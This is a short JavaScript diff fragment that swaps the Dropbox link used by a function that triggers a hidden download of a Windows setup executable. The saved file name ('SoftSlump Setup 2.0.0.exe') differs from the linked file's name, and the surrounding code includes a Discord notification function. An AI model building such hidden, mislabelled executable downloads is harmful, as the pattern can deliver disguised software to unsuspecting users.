@@ -275,7 +275,7 @@ async function notifyDiscord() {
 // ---- START ACTUAL FILE DOWNLOAD ----
 function startFileDownload() {
     const a = document.createElement('a');
-    a.href = 'https://www.dropbox.com/scl/fi/6z84k7f33fz2veukektw8/LumaSkin-Setup.exe?rlkey=1s6dnlmhxzulwpncxppe5dciy&st=zep9q7ul&dl=1';
+    a.href = 'https://www.dropbox.com/scl/fi/rcn3jvvnvuh68lqu6igzp/LumaSink-Setup-2.0.0.exe?rlkey=5jsuq1b4llmj127gj3em53r6e&st=o1nus8pn&dl=1';
     a.download = 'SoftSlump Setup 2.0.0.exe';
     a.style.display = 'none'; // Ensure it's hidden
     document.body.appendChild(a);
